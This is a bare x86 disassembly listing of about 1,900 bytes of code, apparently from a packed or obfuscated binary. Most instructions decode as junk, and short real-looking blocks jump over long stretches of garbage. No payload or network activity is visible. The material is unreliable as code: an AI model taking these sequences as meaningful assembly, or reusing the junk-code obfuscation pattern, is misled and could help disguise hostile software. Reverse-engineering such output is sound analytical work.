  40f2c9:	add    esi,esp
  40f2cb:	data16 cmp bl,BYTE PTR [ebx+0x2ac83415]
  40f2d2:	dec    ebx
  40f2d3:	stc    
  40f2d4:	or     al,0x2f
  40f2d6:	ffree  st(2)
  40f2d8:	cmp    al,BYTE PTR [edi]
  40f2da:	mov    ebx,edx
  40f2dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2dd:	mov    edi,0x7c480889
  40f2e2:	jns    0x40f28f
  40f2e4:	cmp    DWORD PTR [ebx+0x1a5e6436],eax
  40f2ea:	xlat   BYTE PTR ds:[ebx]
  40f2eb:	add    esi,DWORD PTR [esi+0xb76dc3e]
  40f2f1:	addr16 xchg al,bl
  40f2f4:	rcr    DWORD PTR [edi+ebx*8],1
  40f2f7:	pop    esi
  40f2f8:	cmp    BYTE PTR [edx],bl
  40f2fa:	adc    BYTE PTR fs:[ebp+0x10],0x76
  40f2ff:	mov    bl,0xe1
  40f301:	repnz fcmove st,st(6)
  40f304:	sub    BYTE PTR [edx+0x3f],bh
  40f307:	push   0x28
  40f309:	icebp  
  40f30a:	cmp    BYTE PTR [ebp+0x1bca1349],dl
  40f310:	ror    DWORD PTR [eax+ebx*8],1
  40f313:	inc    esp
  40f314:	ins    BYTE PTR es:[edi],dx
  40f315:	sub    eax,0x2af760f8
  40f31a:	arpl   WORD PTR [ecx+0x4b528f6],sp
  40f320:	and    cl,BYTE PTR [ecx-0x17c53e38]
  40f326:	sbb    al,0x4c
  40f328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f329:	inc    esp
  40f32a:	inc    ebx
  40f32b:	div    esi
  40f32d:	and    DWORD PTR [ecx+0x5c379db0],0x5c
  40f334:	sbb    eax,0xbdd914de
  40f339:	mov    bh,0x35
  40f33b:	jle    0x40f363
  40f33d:	out    0x26,al
  40f33f:	test   DWORD PTR [esi+ebx*1],edi
  40f342:	cli    
  40f343:	fsub   QWORD PTR [ebx]
  40f345:	sar    esp,cl
  40f347:	and    al,0x25
  40f349:	jnp    0x40f2ee
  40f34b:	mov    bl,0x9a
  40f34d:	mov    bl,0xc0
  40f34f:	xchg   ebp,eax
  40f350:	std    
  40f351:	fld    TBYTE PTR [eax]
  40f353:	into   
  40f354:	stos   DWORD PTR es:[edi],eax
  40f355:	add    ah,BYTE PTR [ebp-0x69380e87]
  40f35b:	mov    ebp,0xc8370bf7
  40f360:	add    dh,BYTE PTR [esi]
  40f362:	outs   dx,BYTE PTR ds:[esi]
  40f363:	push   ebp
  40f364:	mov    ebp,0xc4a41e4a
  40f369:	rcl    BYTE PTR [edx],1
  40f36b:	mov    ecx,0xda22d88f
  40f370:	shr    ecx,1
  40f372:	mov    ebx,0x1178f1ba
  40f377:	pushf  
  40f378:	es scas eax,DWORD PTR es:[edi]
  40f37a:	adc    BYTE PTR [eax-0x540bdc56],0x82
  40f381:	adc    al,0x52
  40f383:	sub    ebx,edi
  40f385:	popf   
  40f386:	pop    eax
  40f387:	add    BYTE PTR [edi+0x6c84face],dh
  40f38d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f38e:	inc    ebx
  40f38f:	pop    es
  40f390:	mov    esi,0xeb907c04
  40f395:	std    
  40f396:	xchg   DWORD PTR cs:[ebx+eax*8-0x9],esi
  40f39b:	scas   al,BYTE PTR es:[edi]
  40f39c:	ret    
  40f39d:	xchg   ebp,eax
  40f39e:	pop    ecx
  40f39f:	data16 xor BYTE PTR ss:[eax-0x3bb4b776],cl
  40f3a7:	dec    eax
  40f3a8:	xchg   esp,eax
  40f3a9:	mul    ah
  40f3ab:	mov    ds:0xf45a75ac,eax
  40f3b0:	fidiv  DWORD PTR ss:[esi+0x7db654d0]
  40f3b7:	push   edi
  40f3b8:	push   ss
  40f3b9:	into   
  40f3ba:	inc    edi
  40f3bb:	inc    ecx
  40f3bc:	out    dx,eax
  40f3bd:	mov    bh,0x49
  40f3bf:	lock xor edi,DWORD PTR [edi]
  40f3c2:	inc    BYTE PTR [esi-0x10]
  40f3c5:	outs   dx,BYTE PTR ds:[esi]
  40f3c6:	and    al,0x93
  40f3c8:	push   esp
  40f3c9:	pop    ecx
  40f3ca:	loope  0x40f3ab
  40f3cc:	push   ebx
  40f3cd:	aam    0xac
  40f3cf:	add    BYTE PTR [edi-0x10ab9719],bl
  40f3d5:	rcr    edi,cl
  40f3d7:	xor    edx,DWORD PTR ds:0x98ffc892
  40f3dd:	and    edx,eax
  40f3df:	dec    eax
  40f3e0:	xor    BYTE PTR [edi+ebp*4-0x70],al
  40f3e4:	push   ss
  40f3e5:	mov    edi,DWORD PTR cs:[edi+0x3d]
  40f3e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3ea:	(bad)  
  40f3eb:	in     eax,dx
  40f3ec:	dec    eax
  40f3ed:	(bad)  
  40f3ee:	pop    esp
  40f3ef:	idiv   edi
  40f3f1:	arpl   WORD PTR [esi+ebp*8+0x72],cx
  40f3f5:	sub    al,0xc3
  40f3f7:	hlt    
  40f3f8:	pop    esi
  40f3f9:	add    eax,ebx
  40f3fb:	pop    ebx
  40f3fc:	leave  
  40f3fd:	ret    0x8
  40f400:	push   ebp
  40f401:	mov    ebp,esp
  40f403:	push   ecx
  40f404:	mov    DWORD PTR ds:0x433827,0x6a14
  40f40e:	push   ecx
  40f40f:	xor    ecx,edx
  40f411:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40f418:	jmp    0x40f6e7
  40f41d:	call   0xa1f0:0x6df6cd0b
  40f424:	push   ebx
  40f425:	inc    ebx
  40f426:	push   edi
  40f427:	dec    ecx
  40f428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f429:	dec    esi
  40f42a:	xlat   BYTE PTR ds:[ebx]
  40f42b:	xor    ebp,DWORD PTR [bx+0x7eab]
  40f430:	jle    0x40f3de
  40f432:	jl     0x40f4b2
  40f434:	jle    0x40f3f9
  40f436:	ficom  WORD PTR [ebx+0x1c45ec]
  40f43c:	jb     0x40f3f8
  40f43e:	outs   dx,BYTE PTR ds:[esi]
  40f43f:	inc    esp
  40f440:	out    0x1a,al
  40f442:	ins    DWORD PTR es:[edi],dx
  40f443:	xlat   BYTE PTR ds:[ebx]
  40f444:	or     eax,DWORD PTR [esi+0x6f7a01a2]
  40f44a:	stos   BYTE PTR es:[edi],al
  40f44b:	cwde   
  40f44c:	inc    ebx
  40f44e:	(bad)  
  40f450:	data16 jge 0x40f482
  40f453:	and    eax,0xf4506a39
  40f458:	and    DWORD PTR [esi-0x19],eax
  40f45b:	push   ebx
  40f45c:	and    DWORD PTR [eax],eax
  40f45e:	cmp    BYTE PTR [esi],0x40
  40f461:	push   0x3201a415
  40f466:	sub    al,0x46
  40f468:	adc    bl,bh
  40f46a:	and    eax,0x4691e271
  40f46f:	jp     0x40f404
  40f471:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f472:	stos   BYTE PTR es:[edi],al
  40f473:	retf   0x94bc
  40f476:	in     eax,dx
  40f477:	dec    edx
  40f478:	shr    BYTE PTR [edi+0x72],0x1e
  40f47c:	mov    DWORD PTR [edx-0x7d1af6a0],esp
  40f482:	mov    esp,0x8736f88b
  40f487:	adc    BYTE PTR [esi+0x65],ch
  40f48a:	jmp    DWORD PTR ds:0xaf71ef27
  40f490:	ja     0x40f44d
  40f492:	push   ecx
  40f493:	lods   al,BYTE PTR ds:[esi]
  40f494:	jae    0x40f4e2
  40f496:	push   ecx
  40f497:	daa    
  40f498:	test   al,0x49
  40f49a:	xchg   edi,eax
  40f49b:	jl     0x40f49c
  40f49d:	out    dx,al
  40f49e:	loopne 0x40f46b
  40f4a0:	das    
  40f4a1:	ins    BYTE PTR es:[edi],dx
  40f4a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4a3:	bound  esi,QWORD PTR [edx]
  40f4a5:	jmp    0x129b7ef7
  40f4aa:	mov    al,al
  40f4ac:	xchg   edi,eax
  40f4ad:	stc    
  40f4ae:	mov    bl,0x1c
  40f4b0:	sub    al,0xd5
  40f4b2:	in     al,dx
  40f4b3:	adc    WORD PTR [ebp+0xa],si
  40f4b7:	loop   0x40f440
  40f4b9:	dec    ecx
  40f4ba:	pop    esi
  40f4bb:	dec    edi
  40f4bc:	mov    al,ds:0xb391601d
  40f4c1:	das    
  40f4c2:	lock dec esp
  40f4c4:	pop    esp
  40f4c5:	or     al,0x14
  40f4c7:	and    DWORD PTR [esi],esi
  40f4c9:	dec    ecx
  40f4ca:	and    cl,BYTE PTR [esi]
  40f4cc:	outs   dx,BYTE PTR ds:[esi]
  40f4cd:	mov    al,ds:0x87531ff8
  40f4d2:	stos   DWORD PTR es:[edi],eax
  40f4d3:	arpl   WORD PTR [edi],ax
  40f4d5:	mov    eax,0xaa6c009
  40f4da:	mov    cl,0xba
  40f4dc:	addr16 cmc 
  40f4de:	cmp    al,0xe8
  40f4e0:	inc    ecx
  40f4e1:	scas   al,BYTE PTR es:[edi]
  40f4e2:	mov    bh,0xc3
  40f4e4:	mov    edx,0xda4b88bc
  40f4e9:	jbe    0x40f55d
  40f4eb:	rcr    al,cl
  40f4ed:	iret   
  40f4ee:	cli    
  40f4ef:	cs and eax,0xea2005bd
  40f4f5:	mov    DWORD PTR [edx+0x58cfbe1f],eax
  40f4fb:	jl     0x40f567
  40f4fd:	jnp    0x40f4db
  40f4ff:	lock adc ch,BYTE PTR es:[eax-0xa20fa08]
  40f507:	lds    edx,FWORD PTR [ecx]
  40f509:	mov    cl,0x3b
  40f50b:	mov    bl,0x14
  40f50d:	aas    
  40f50e:	outs   dx,DWORD PTR ds:[esi]
  40f50f:	lock aas 
  40f511:	punpcklwd mm3,mm7
  40f514:	fsubr  QWORD PTR [ebp+ebx*8-0x2258a2df]
  40f51b:	push   edi
  40f51c:	loopne 0x40f4b3
  40f51e:	mov    ecx,0xf30c8adb
  40f523:	repz pop es
  40f525:	and    BYTE PTR [esi+0x1c],bh
  40f528:	int3   
  40f529:	mov    ebp,0x9827ffd6
  40f52e:	or     ebp,DWORD PTR [edi]
  40f530:	fidiv  DWORD PTR [ebx-0x64]
  40f533:	iretw  
  40f535:	jmp    0x40f5a5
  40f537:	stos   DWORD PTR es:[edi],eax
  40f538:	call   0x5bac:0xbcb1e89
  40f53f:	pop    ecx
  40f540:	xchg   BYTE PTR [ecx],ch
  40f542:	ficomp WORD PTR ds:0x7d52c3c6
  40f548:	jno    0x40f4d8
  40f54a:	das    
  40f54b:	add    esp,DWORD PTR [ebx+0x44]
  40f54e:	sti    
  40f54f:	cmp    bl,BYTE PTR ds:0x51c6f11c
  40f555:	or     ebx,DWORD PTR ds:0xa546e788
  40f55b:	inc    esp
  40f55c:	ins    DWORD PTR es:[edi],dx
  40f55d:	fist   WORD PTR ds:0x846da4eb
  40f563:	aaa    
  40f564:	mov    eax,ds:0xa976de1d
  40f569:	xor    BYTE PTR [esp+edx*1-0x7a42449c],bl
  40f570:	inc    edx
  40f571:	jg     0x40f5cd
  40f573:	scas   eax,DWORD PTR es:[edi]
  40f574:	or     al,0xe2
  40f576:	(bad)  
  40f577:	mov    ecx,0x8056737f
  40f57c:	adc    eax,0x47d692ed
  40f581:	lea    edx,[ebx+0x24]
  40f584:	xor    al,0x68
  40f586:	shr    BYTE PTR [eax+0x2f1438c5],cl
  40f58c:	push   ds
  40f58d:	xchg   edi,eax
  40f58e:	inc    esp
  40f58f:	mov    ebx,0xaf03c44d
  40f594:	outs   dx,BYTE PTR ds:[esi]
  40f595:	or     al,0x50
  40f597:	or     BYTE PTR [ecx],bh
  40f599:	in     al,0x25
  40f59b:	fld    QWORD PTR [edi-0x2a]
  40f59e:	cmp    dl,dl
  40f5a0:	hlt    
  40f5a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5a2:	je     0x40f578
  40f5a4:	sahf   
  40f5a5:	jae    0x40f540
  40f5a7:	in     eax,0x69
  40f5a9:	add    BYTE PTR [ebx+0x43],al
  40f5ac:	push   edx
  40f5ad:	adc    eax,DWORD PTR [eax]
  40f5af:	inc    ebx
  40f5b0:	fs jp  0x40f5d8
  40f5b3:	xchg   DWORD PTR [esi],ecx
  40f5b5:	cmp    ah,al
  40f5b7:	ins    DWORD PTR es:[edi],dx
  40f5b8:	leave  
  40f5b9:	mov    DWORD PTR [ebx+esi*4-0x121e2a41],ebx
  40f5c0:	mov    al,0x47
  40f5c2:	xor    edi,ebp
  40f5c4:	sub    eax,0x73f5a691
  40f5c9:	pop    esi
  40f5ca:	stos   BYTE PTR es:[edi],al
  40f5cb:	or     eax,esp
  40f5cd:	mov    ebp,0xc3a52653
  40f5d2:	or     eax,0x15faa590
  40f5d7:	xor    BYTE PTR [edi-0x1c3ee4b1],bh
  40f5dd:	mov    al,0xf6
  40f5df:	loop   0x40f657
  40f5e1:	fisubr DWORD PTR [esi]
  40f5e3:	mov    al,ds:0xe2024478
  40f5e8:	fdiv   DWORD PTR [edi]
  40f5ea:	inc    esp
  40f5eb:	in     al,dx
  40f5ec:	leave  
  40f5ed:	iret   
  40f5ee:	mov    dl,0x1a
  40f5f0:	dec    eax
  40f5f1:	les    ecx,FWORD PTR [eax+eax*4]
  40f5f4:	lea    ebp,[esi-0x7d5ff45c]
  40f5fa:	adc    BYTE PTR [esi+0x16],bh
  40f5fd:	and    cl,BYTE PTR [edx]
  40f5ff:	out    0x8a,eax
  40f601:	out    dx,eax
  40f602:	push   esi
  40f603:	or     BYTE PTR [ebp-0x71],bl
  40f606:	xchg   BYTE PTR [eax-0x7f],ch
  40f609:	jmp    0xd4a:0x243b2b48
  40f610:	mov    ecx,0x718f934b
  40f615:	shl    edx,1
  40f617:	cmp    bh,BYTE PTR [edi]
  40f619:	dec    BYTE PTR [edx+0x1b92177f]
  40f61f:	fadd   QWORD PTR [ebx-0x38]
  40f622:	mov    esi,0x25f216a4
  40f627:	out    0xc7,al
  40f629:	add    BYTE PTR [esi+eax*2+0x26],0xc5
  40f62e:	fs pushf 
  40f630:	aas    
  40f631:	(bad)  [edx+edx*4+0x2c739af1]
  40f638:	push   edi
  40f639:	je     0x40f61f
  40f63b:	sub    eax,0xe7947a60
  40f640:	repz push edi
  40f642:	or     BYTE PTR [eax+0xf],cl
  40f645:	mov    al,0x33
  40f647:	sub    al,0x5b
  40f649:	jne    0x40f6a2
  40f64b:	loopne 0x40f6c7
  40f64d:	mov    eax,0x43e6e40b
  40f652:	std    
  40f653:	cmp    BYTE PTR [edi],ah
  40f655:	ins    BYTE PTR es:[edi],dx
  40f656:	mov    bl,0x1c
  40f658:	jmp    0x10d3:0xa3c437d4
  40f65f:	mov    WORD PTR [edx],cs
  40f661:	loop   0x40f66d
  40f663:	pminub mm1,mm0
  40f666:	cmp    ebx,DWORD PTR fs:[esi]
  40f669:	call   0x85bdd802
  40f66e:	sub    eax,0xc3713942
  40f673:	test   DWORD PTR ds:0xdee468bd,ebx
  40f679:	(bad)  
  40f67b:	adc    eax,0x75168de0
  40f680:	cmp    al,0x3c
  40f682:	je     0x40f696
  40f684:	cmp    eax,0x2df2d9fa
  40f689:	adc    ecx,DWORD PTR [eax]
  40f68b:	jle    0x40f707
  40f68d:	inc    eax
  40f68e:	out    dx,eax
  40f68f:	mov    es,esi
  40f691:	mov    ds:0x33dd8d09,eax
  40f696:	jo     0x40f70c
  40f698:	out    dx,eax
  40f699:	jno    0x40f6a9
  40f69b:	pop    esp
  40f69c:	(bad)  
  40f69d:	pop    esi
  40f69e:	push   0xffffffa0
  40f6a0:	and    al,0x1a
  40f6a2:	les    edi,FWORD PTR [esi+ecx*8-0x4c]
  40f6a6:	out    dx,eax
  40f6a7:	bound  esi,QWORD PTR [edi-0x49]
  40f6aa:	pop    ecx
  40f6ab:	lds    ebp,FWORD PTR fs:[eax+edx*2-0x68]
  40f6b0:	call   0x79d77c67
  40f6b5:	popa   
  40f6b6:	dec    eax
  40f6b7:	fldenv [ecx-0x19]
  40f6ba:	xchg   esi,eax
  40f6bb:	es jecxz 0x40f6e6
  40f6be:	nop
  40f6bf:	jno    0x40f725
  40f6c1:	inc    ecx
  40f6c2:	mov    al,ds:0xdf8181ea
  40f6c7:	in     eax,dx
  40f6c8:	scas   al,BYTE PTR es:[edi]
  40f6c9:	rcl    BYTE PTR [ebx+0x75],cl
  40f6cc:	inc    esi
  40f6cd:	pand   mm1,QWORD PTR ds:0x7bc51f34
  40f6d4:	jge    0x40f678
  40f6d6:	xchg   ebp,eax
  40f6d7:	retf   
  40f6d8:	pop    esp
  40f6d9:	loop   0x40f738
  40f6db:	jmp    WORD PTR [ebp-0x17]
  40f6df:	iret   
  40f6e0:	mov    ebx,0x5223a862
  40f6e5:	xchg   ebx,eax
  40f6e6:	(bad)  
  40f6e7:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f6ee:	sub    DWORD PTR ds:0x433827,0x5c72
  40f6f8:	mov    eax,DWORD PTR [ebp-0x4]
  40f6fb:	add    DWORD PTR ds:0x4337e7,0x767c
  40f705:	jmp    0x40f9d4
  40f70a:	ins    BYTE PTR es:[edi],dx
  40f70b:	xchg   BYTE PTR [eax+0x70d870dc],ah
  40f711:	xchg   esi,eax
  40f712:	in     eax,0xdf
  40f714:	or     eax,ebp
  40f716:	aas    
  40f717:	lahf   
  40f718:	in     al,dx
  40f719:	mov    eax,0x7e7eb6dd
  40f71e:	lods   al,BYTE PTR ds:[esi]
  40f71f:	jl     0x40f79f
  40f721:	jle    0x40f70d
  40f723:	add    dl,ah
  40f725:	pop    edi
  40f726:	ror    cl,0x47
  40f729:	mov    ds:0xe230cc0e,eax
  40f72e:	jae    0x40f6f2
  40f730:	cmp    esi,DWORD PTR [edi]
  40f732:	ficom  WORD PTR [ecx]
  40f734:	rol    dl,0x80
  40f737:	pop    edi
  40f738:	jl     0x40f777
  40f73a:	in     al,0xa8
  40f73c:	or     eax,0x4354c35c
  40f741:	enter  0xcac2,0xf8
  40f745:	scas   eax,DWORD PTR es:[edi]
  40f746:	jmp    0x1880:0x8acdf0c3
  40f74d:	ficom  DWORD PTR [edi-0x6a]
  40f750:	xchg   BYTE PTR [edi-0x780024e6],cl
  40f756:	mov    esp,0x1931103a
  40f75b:	push   cs
  40f75c:	push   0xa96e8acd
  40f761:	test   BYTE PTR [edx+0x37e29243],0x93
  40f768:	js     0x40f7e5
  40f76a:	adc    al,0x2d
  40f76c:	xchg   edi,eax
  40f76d:	sahf   
  40f76e:	ins    DWORD PTR es:[edi],dx
  40f76f:	call   0x87dd:0x9c47d14a
  40f776:	popf   
  40f777:	cmp    DWORD PTR ds:0x2fae7a9b,ebp
  40f77d:	scas   eax,DWORD PTR es:[edi]
  40f77e:	jmp    0x40f707
  40f780:	ds inc ebx
  40f782:	push   0x53a6186f
  40f787:	jnp    0x40f7f1
  40f789:	arpl   WORD PTR [esi],bp
  40f78b:	dec    ecx
  40f78c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f78d:	gs xchg ebp,eax
  40f78f:	sti    
  40f790:	jle    0x40f804
  40f792:	xchg   ebx,eax
  40f793:	push   ecx
  40f794:	jge    0x40f802
  40f796:	add    BYTE PTR [ebx],cl
  40f798:	imul   ecx,DWORD PTR [ebx+ebp*4-0x49],0xf5b84e54
  40f7a0:	addr16 jne 0x40f780
  40f7a3:	jp     0x40f7bf
  40f7a5:	ja     0x40f7e3
  40f7a7:	dec    ebx
  40f7a8:	call   0x1bec:0x591477d8
  40f7af:	lods   al,BYTE PTR ds:[esi]
  40f7b0:	mov    ds:0x87a2f946,eax
  40f7b5:	mov    ebp,DWORD PTR [ecx+0x53c06e57]
  40f7bb:	fucomip st,st(1)
  40f7bd:	in     al,dx
  40f7be:	scas   al,BYTE PTR es:[edi]
  40f7bf:	pop    eax
  40f7c0:	mov    dl,0x36
  40f7c2:	int3   
  40f7c3:	mov    eax,ds:0xe87d5db5
  40f7c8:	or     ebp,eax
  40f7ca:	mov    ebp,0x93faa483
  40f7cf:	inc    esi
  40f7d0:	mov    ebp,0xcff2297a
  40f7d5:	pop    esi
  40f7d6:	jle    0x40f791
  40f7d8:	cli    
  40f7d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7da:	mov    edi,DWORD PTR [esp+edi*1+0x27cb10fc]
  40f7e1:	xchg   ebx,eax
  40f7e2:	in     eax,dx
  40f7e3:	dec    dx
  40f7e5:	xlat   BYTE PTR ds:[ebx]
  40f7e6:	dec    edx
  40f7e7:	xor    eax,0x849db81c
  40f7ec:	lock pushf 
  40f7ee:	xchg   edi,eax
  40f7ef:	pop    ebp
  40f7f0:	daa    
  40f7f1:	cmp    al,0xd8
  40f7f3:	scas   eax,DWORD PTR es:[edi]
  40f7f4:	ins    DWORD PTR es:[edi],dx
  40f7f5:	loopne 0x40f831
  40f7f7:	(bad)  
  40f7f8:	ror    BYTE PTR [edx-0x26],0xff
  40f7fc:	push   ss
  40f7fd:	ds mov esi,0x7c8228e1
  40f803:	jne    0x40f7df
  40f805:	gs xor al,0x8c
  40f808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f809:	mov    ds:0xdfcf4a29,eax
  40f80e:	and    eax,0x2570e6d9
  40f813:	sbb    al,0x17
  40f815:	cdq    
  40f816:	bound  esi,QWORD PTR [esi+0x68e78aee]
  40f81c:	inc    eax
  40f81d:	cs cwde 
  40f81f:	and    cl,BYTE PTR [ebx-0x46]
  40f822:	jmp    0x81d683e
  40f827:	(bad)  
  40f828:	xchg   ebx,eax
  40f829:	jae    0x40f888
  40f82b:	mov    eax,0x760ec098
  40f830:	pop    ebx
  40f831:	push   edx
  40f832:	shr    BYTE PTR [ecx-0x14],1
  40f835:	mov    ecx,DWORD PTR [eax]
  40f837:	pop    esp
  40f838:	ret    0xc0b5
  40f83b:	es jmp 0x83ef8666
  40f841:	lds    ebp,FWORD PTR [eax]
  40f843:	adc    esi,DWORD PTR [ebx+0xc]
  40f846:	(bad)  
  40f847:	in     al,0x7c
  40f849:	mov    dl,0x27
  40f84b:	test   BYTE PTR [ebp+0x695bbb3e],al
  40f851:	sub    DWORD PTR [edx+0x14],ecx
  40f854:	xor    dh,BYTE PTR [ebx-0x71]
  40f857:	mov    DWORD PTR [eax-0x684a5699],edx
  40f85d:	and    DWORD PTR [eax],ebp
  40f85f:	cdq    
  40f860:	imul   ebp,DWORD PTR [esi+0x30a0f07b],0x72
  40f867:	jns    0x40f8d7
  40f869:	inc    ebp
  40f86a:	shl    BYTE PTR [ebx],cl
  40f86c:	sti    
  40f86d:	jns    0x40f885
  40f86f:	out    dx,al
  40f870:	sub    BYTE PTR [edx+eax*1-0x769722a1],bl
  40f877:	imul   ebp,ebx,0x3
  40f87a:	loope  0x40f877
  40f87c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f87d:	xchg   esi,eax
  40f87e:	out    0x87,al
  40f880:	mov    ?,WORD PTR [ebp+0x62]
  40f883:	or     esp,DWORD PTR [ebp+0x13]
  40f886:	cmp    BYTE PTR [esi],0x23
  40f889:	lods   al,BYTE PTR fs:[esi]
  40f88b:	into   
  40f88c:	cld    
  40f88d:	pop    es
  40f88e:	adc    eax,0x9936ad0d
  40f893:	sbb    edx,edi
  40f895:	sub    bl,cl
  40f897:	sti    
  40f898:	jo     0x40f851
  40f89a:	shl    DWORD PTR [edi-0x56e3fb7d],0x81
  40f8a1:	xchg   ebp,eax
  40f8a2:	shl    BYTE PTR [ecx-0x49e5321a],1
  40f8a8:	push   ss
  40f8a9:	(bad)  
  40f8aa:	cmp    eax,0xd1a88e57
  40f8af:	add    eax,0xe6dfe486
  40f8b4:	mov    ah,0xb3
  40f8b6:	rcr    al,0x38
  40f8b9:	mov    ds:0x7e2859fa,al
  40f8be:	jne    0x40f877
  40f8c0:	imul   edx,DWORD PTR [edi+0x2e],0x29
  40f8c4:	fsubr  st,st(3)
  40f8c6:	xchg   ecx,eax
  40f8c7:	dec    edi
  40f8c8:	mov    cs:0xd2e872a3,al
  40f8ce:	test   DWORD PTR [ebx],ebp
  40f8d0:	add    BYTE PTR [ebx],bh
  40f8d2:	adc    eax,0x3e11d695
  40f8d7:	pop    eax
  40f8d8:	xchg   DWORD PTR [esi-0x2484611f],edi
  40f8de:	fild   QWORD PTR [edi-0x1c]
  40f8e1:	inc    esi
  40f8e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8e3:	jo     0x40f916
  40f8e5:	ret    
  40f8e6:	fwait
  40f8e7:	in     eax,dx
  40f8e8:	adc    eax,DWORD PTR [edx-0x50dc3b14]
  40f8ee:	push   edi
  40f8ef:	ret    0xb4c1
  40f8f2:	out    dx,eax
  40f8f3:	adc    eax,0x58c1c8d6
  40f8f8:	das    
  40f8f9:	ret    0xb6ef
  40f8fc:	pop    ebx
  40f8fd:	inc    edi
  40f8fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8ff:	jmp    0xba41:0x6ce88ab3
  40f906:	push   ecx
  40f907:	sbb    DWORD PTR ds:0x7f4265eb,0x99412535
  40f911:	ret    0xb932
  40f914:	push   es
  40f915:	cs mov bx,0x3d1e
  40f91a:	mov    cl,0x38
  40f91c:	sub    ch,BYTE PTR [edx-0x6e6775fe]
  40f922:	scas   al,BYTE PTR es:[edi]
  40f923:	mov    cl,0xa
  40f925:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f926:	rcl    DWORD PTR [ebp+0x13],cl
  40f929:	pop    ecx
  40f92a:	fisubr DWORD PTR [edi-0x2bf27be8]
  40f930:	nop
  40f931:	cs iret 
  40f933:	adc    BYTE PTR ds:0x6d5e6b58,dh
  40f939:	jns    0x40f8c2
  40f93b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f93c:	push   ebx
  40f93d:	and    esp,ebp
  40f93f:	mov    al,ds:0xbb6c3f96
  40f944:	sub    al,0xd9
  40f946:	popa   
  40f947:	push   edx
  40f948:	inc    ecx
  40f949:	ja     0x40f96c
  40f94b:	out    0xce,al
  40f94d:	inc    ebp
  40f94e:	fsub   DWORD PTR [esp+edi*8]
  40f951:	cli    
  40f952:	sub    edi,edi
  40f954:	fs sub eax,0xd80a658a
  40f95a:	sub    cl,BYTE PTR [esi+0x62bd6487]
  40f960:	stc    
  40f961:	jecxz  0x40f9b1
  40f963:	das    
  40f964:	in     eax,0x2a
  40f966:	in     eax,0x7b
  40f968:	jne    0x40f960
  40f96a:	test   al,0x29
  40f96c:	aad    0xe9
  40f96e:	and    al,0x4c
  40f970:	pop    eax
  40f971:	ret    0xe1d3
  40f974:	(bad)  
  40f975:	pop    edi
  40f976:	xor    cl,al
  40f978:	jb     0x40f986
  40f97a:	mov    bl,0xd0
  40f97c:	clc    
  40f97d:	or     dl,BYTE PTR [edi+0x18310ecc]
  40f983:	cdq    
  40f984:	cmc    
  40f985:	idiv   bl
  40f987:	adc    DWORD PTR [eax+0x512255b8],esi
  40f98d:	lahf   
  40f98e:	add    eax,0xe1bfcfbe
  40f993:	push   edi
  40f994:	fsubr  DWORD PTR [eax]
  40f996:	fiadd  WORD PTR [edx]
  40f998:	or     DWORD PTR [eax+esi*1-0x7f0d75f1],esp
  40f99f:	and    esp,edi
  40f9a1:	outs   dx,BYTE PTR ds:[esi]
  40f9a2:	xchg   esp,eax
  40f9a3:	dec    ebx
  40f9a4:	hlt    
  40f9a5:	in     al,0x65
  40f9a7:	into   
  40f9a8:	pop    edi
  40f9a9:	mov    esi,0x6bf1eb28
  40f9ae:	popf   
  40f9af:	adc    BYTE PTR [esi-0x26],dh
  40f9b2:	sbb    eax,DWORD PTR [eax+0x58]
  40f9b5:	imul   esp,DWORD PTR [ecx],0xe997a593
  40f9bb:	pop    esi
  40f9bc:	dec    edi
  40f9bd:	mov    ebx,0xa6adc701
  40f9c2:	retf   0xa9e9
  40f9c5:	out    0xd9,al
  40f9c7:	cs dec ebx
  40f9c9:	test   cl,cl
  40f9cb:	mov    al,0x53
  40f9cd:	fadd   st(3),st
  40f9cf:	gs cs scas al,BYTE PTR es:[edi]
  40f9d2:	jmp    0x40f9af
  40f9d4:	push   esi
  40f9d5:	adc    esi,DWORD PTR ds:0x433777
  40f9db:	mov    esi,DWORD PTR [ebp-0x8]
  40f9de:	movzx  ecx,BYTE PTR ds:0x43377b
  40f9e5:	adc    DWORD PTR ds:0x433833,ecx
  40f9eb:	mov    edx,0x7510854
  40f9f0:	xor    eax,edx
  40f9f2:	xor    ecx,0x76d3
  40f9f8:	xor    esi,edx
  40f9fa:	mov    ecx,0x32729b
  40f9ff:	jmp    0x40fcce
  40fa04:	mov    eax,ds:0x696d6976
  40fa09:	jno    0x40f9ac
  40fa0b:	jb     0x40fa43
  40fa0d:	inc    eax
  40fa0e:	pop    eax
  40fa0f:	outs   dx,DWORD PTR ds:[esi]
  40fa10:	dec    ecx
  40fa11:	std    
  40fa12:	pop    ebx
  40fa13:	(bad)  [ebx]
  40fa15:	mov    ch,0x7e
  40fa17:	jle    0x40f9c5
  40fa19:	jl     0x40fa99
  40fa1b:	jle    0x40f9fc
  40fa1d:	cwde   
  40fa1e:	into   
  40fa1f:	sub    eax,0x8a377b39
  40fa24:	hlt    
  40fa25:	mov    dh,0x6d
  40fa27:	mov    WORD PTR [edi-0x3c],?
  40fa2a:	xchg   esi,eax
  40fa2b:	adc    al,0x27
  40fa2d:	in     eax,dx
  40fa2e:	in     al,0x75
  40fa30:	out    dx,al
  40fa31:	xchg   esi,esi
  40fa33:	sbb    ebx,ecx
  40fa35:	mov    ch,0xb3
  40fa37:	xor    BYTE PTR [esi+0x5a],ah
  40fa3a:	inc    edx
  40fa3b:	or     edi,DWORD PTR [esp+ebp*2+0x7a3017c0]
